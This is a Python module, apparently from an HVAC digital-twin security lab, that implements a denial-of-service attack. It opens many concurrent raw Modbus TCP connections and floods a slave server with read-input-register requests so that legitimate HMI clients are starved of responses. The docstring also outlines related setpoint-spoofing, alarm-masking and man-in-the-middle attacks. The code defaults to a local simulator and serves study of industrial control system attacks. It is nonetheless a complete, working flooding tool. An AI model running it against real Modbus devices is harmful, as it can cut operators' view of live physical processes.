"""Attack scenario #4: request flood against the closet's Modbus TCP port.

setpoint_spoof.py and alarm_mask.py write into address space the ladder
expects a master to write; mitm_proxy.py rewrites specific reads in 
flight. This scenario needs neither, it hammers the slave server
with legitimate-looking Modbus reads from many concurrent connections,
faster than a real HMI ever would. DigiTwin's ModbusSlaveServer runs a
single asyncio event loop on its own background thread, independent of
the twin's scan-loop thread, so the effect isn't a crash loop or a
corruped value, it's every *other* client sharing
that event loop getting starved of scheduling time. That's "loss of
view," not "loss of control": a real HMI polling the same port goes
slow/stale while the physical process keeps running unattended, which
`sim.scan_count` continuing to climb throughout the flood proves
directly.

No pymodbus needed here -- these are raw Modbus TCP ADUs (MBAP header +
a minimal read-input-registers PDU) sent in a tight loop per connection,
by design: this is meant to look like naive request flooding, not a
well-behaved client.

    uv run python -m hvac_twin.attacks.dos_flood --connections 50 --duration 15
"""


from __future__ import annotations

import argparse
import socket
import struct
import threading

_MBAP_LEN = 7
_READ_INPUT_REGISTERS = 4
_UNIT_ID = 1


def _read_input_registers_request(transaction_id: int, address: int, quantity: int) -> bytes:
    pdu = struct.pack(">BHH", _READ_INPUT_REGISTERS, address, quantity)
    header = struct.pack(">HHHB", transaction_id, 0, len(pdu) + 1, _UNIT_ID)
    return header + pdu


def _recv_exact(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _flood_worker(
    host: str, port: int, stop: threading.Event, counts: list[int], worker_id: int
) -> None:
    sent = 0
    try:
        sock = socket.create_connection((host, port), timeout=2.0)
    except OSError:
        counts[worker_id] = 0
        return
    try:
        transaction_id = 0
        while not stop.is_set():
            transaction_id = (transaction_id + 1) & 0xFFFF
            sock.sendall(_read_input_registers_request(transaction_id, address=0, quantity=1))
            header = _recv_exact(sock, _MBAP_LEN)
            if header is None:
                break
            _, _, length, _ = struct.unpack(">HHHB", header)
            if _recv_exact(sock, length - 1) is None:
                break
            sent += 1
    except OSError:
        pass
    finally:
        counts[worker_id] = sent
        sock.close()


def run_flood(
    host: str,
    port: int,
    *,
    connections: int,
    duration_s: float,
    stop_event: threading.Event | None = None,
) -> int:
    """Open `connections` concurrent Modbus TCP connections against
    host:port and hammer read-input-register requests on each for
    `duration_s` seconds (or until `stop_event` is set, if given -- the
    attack console uses this to end a flood on request instead of only
    ever waiting out a fixed duration). Returns the total request/response
    round-trips completed across all connections, so a caller can confirm
    the flood actually landed traffic."""
    stop = stop_event if stop_event is not None else threading.Event()
    counts = [0] * connections
    workers = [
        threading.Thread(target=_flood_worker, args=(host, port, stop, counts, i), daemon=True)
        for i in range(connections)
    ]
    for worker in workers:
        worker.start()
    stop.wait(duration_s)
    stop.set()
    for worker in workers:
        worker.join(timeout=2.0)
    return sum(counts)


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument("--connections", type=int, default=50, help="concurrent flood connections")
    parser.add_argument("--duration", type=float, default=15.0, help="seconds to flood")
    args = parser.parse_args(argv)

    print(
        f"flooding {args.host}:{args.port} with {args.connections} connections "
        f"for {args.duration:.0f}s"
    )
    total = run_flood(args.host, args.port, connections=args.connections, duration_s=args.duration)
    print(
        f"flood complete: {total} request/response round-trips "
        f"across {args.connections} connections"
    )



if __name__ == "__main__":
    main()